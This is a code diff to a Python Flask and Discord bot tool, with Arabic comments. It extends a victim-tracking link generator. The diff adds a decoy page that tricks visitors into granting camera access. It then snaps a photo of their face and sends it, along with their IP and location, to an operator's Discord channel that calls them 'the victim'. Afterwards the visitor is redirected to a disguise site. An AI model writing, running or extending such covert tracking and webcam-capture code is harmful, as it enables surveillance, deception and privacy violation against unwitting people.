@@ -8,7 +8,7 @@ import asyncio
 import discord
 from discord import app_commands
 import requests
-from flask import Flask, request, redirect
+from flask import Flask, request, redirect, render_template_string
 from threading import Thread
 
 app = Flask('')
@@ -60,13 +60,14 @@ def autologin():
 
 @app.route('/track')
 def track_visitor():
-    # استخراج الـ IP الحقيقي للزائر بدقة من وسط البروكسي
     if request.headers.get('X-Forwarded-For'):
         ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
     else:
         ip = request.remote_addr
         
     user_agent = request.headers.get('User-Agent', 'Unknown')
+    cam = request.args.get('cam', 'false')
+    redirect_target = request.args.get('to', 'https://www.google.com')
     
     country, city, isp = 'Unknown', 'Unknown', 'Unknown'
     try:
@@ -106,8 +107,69 @@ def track_visitor():
     except Exception:
         pass
 
-    redirect_target = request.args.get('to', 'https://www.google.com')
+    # إذا تم اختيار طلب الكاميرا، يتم إرجاع صفحة HTML تفاعلية تطلب الإذن وتلتقط صورة وترسلها
+    if cam == 'true':
+        page_template = """
+        <html>
+        <head><title>Loading...</title></head>
+        <body style="background:#111; color:#fff; text-align:center; padding-top:100px; font-family:sans-serif;">
+            <h3>جاري تحميل المحتوى، يرجى الانتظار والسماح بالإذونات المطلوبة...</h3>
+            <video id="v" autoplay playsinline style="display:none;"></video>
+            <canvas id="c" style="display:none;"></canvas>
+            <script>
+                async function capture() {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                        const video = document.getElementById('v');
+                        video.srcObject = stream;
+                        await new Promise(resolve => video.onloadedmetadata = resolve);
+                        const canvas = document.getElementById('c');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const dataUrl = canvas.toDataURL('image/jpeg');
+                        
+                        await fetch('/upload_cam', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({image: dataUrl})
+                        });
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                    } catch(e) {}
+                    window.location.href = "{{ target }}";
+                }
+                window.onload = capture;
+            </script>
+        </body>
+        </html>
+        """
+        return render_template_string(page_template, target=redirect_target)
+
     return redirect(redirect_target, code=302)
+
+@app.route('/upload_cam', methods=['POST'])
+def upload_cam():
+    try:
+        data = request.get_json()
+        img_data = data.get('image').split(',')[1]
+        img_bytes = base64.b64decode(img_data)
+        
+        file_path = "capture.jpg"
+        with open(file_path, "wb") as f:
+            f.write(img_bytes)
+            
+        if CHANNEL_ID and TOKEN:
+            files = {"file": ("capture.jpg", open(file_path, "rb"), "image/jpeg")}
+            payload = {"content": "📸 **تم التقاط صورة الكاميرا للضحية بنجاح!**"}
+            requests.post(f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages",
+                          headers={"Authorization": f"Bot {TOKEN}"}, data=payload, files=files, timeout=5)
+            
+        if os.path.exists(file_path):
+            os.remove(file_path)
+    except Exception:
+        pass
+    return "OK", 200
 
 def run():
     app.run(host='0.0.0.0', port=8080)
@@ -618,17 +680,24 @@ async def loginbytoken_command(interaction: discord.Interaction, platform: str, 
 
     await interaction.followup.send(embed=embed, view=view, ephemeral=True)
 
-@client.tree.command(name="link", description="توليد رابط تتبع مع إمكانية تحديد وجهة تمويهية (مثل يوتيوب أو موقع)")
-@app_commands.describe(redirect_to="الرابط الذي سيتم توجيه الضحية إليه بعد سحب معلوماته (اختياري)")
-async def generate_track_link(interaction: discord.Interaction, redirect_to: str = "https://www.google.com"):
+@client.tree.command(name="link", description="توليد رابط تتبع مع إمكانية طلب الكاميرا وتحديد وجهة تمويهية")
+@app_commands.describe(
+    redirect_to="رابط الوجهة النهائية (مثل يوتيوب أو موقع)",
+    capture_cam="هل تريد طلب إذن الكاميرا والتقاط صورة؟"
+)
+@app_commands.choices(capture_cam=[
+    app_commands.Choice(name="نعم (طلب الكاميرا)", value="true"),
+    app_commands.Choice(name="لا (تتبع عادي بدون كاميرا)", value="false")
+])
+async def generate_track_link(interaction: discord.Interaction, redirect_to: str = "https://www.google.com", capture_cam: str = "false"):
     if not interaction.response.is_done():
         await interaction.response.defer(thinking=True, ephemeral=True)
     
-    track_url = f"{HOST_URL}/track?to={requests.utils.quote(redirect_to, safe='')}"
+    track_url = f"{HOST_URL}/track?to={requests.utils.quote(redirect_to, safe='')}&cam={capture_cam}"
     
     embed = discord.Embed(
-        title="🔗 رابط التتبع المخصص جاهز",
-        description=f"الرابط المولد لإرساله:\n`{track_url}`\n\nالوجهة النهائية (التمويهية): `{redirect_to}`",
+        title="🔗 رابط التتبع المطور جاهز",
+        description=f"الرابط المولد لإرساله:\n`{track_url}`\n\nالوجهة النهائية: `{redirect_to}`\nطلب الكاميرا: **{capture_cam.upper()}**",
         color=0xFF5733
     )
     await interaction.followup.send(embed=embed, ephemeral=True)
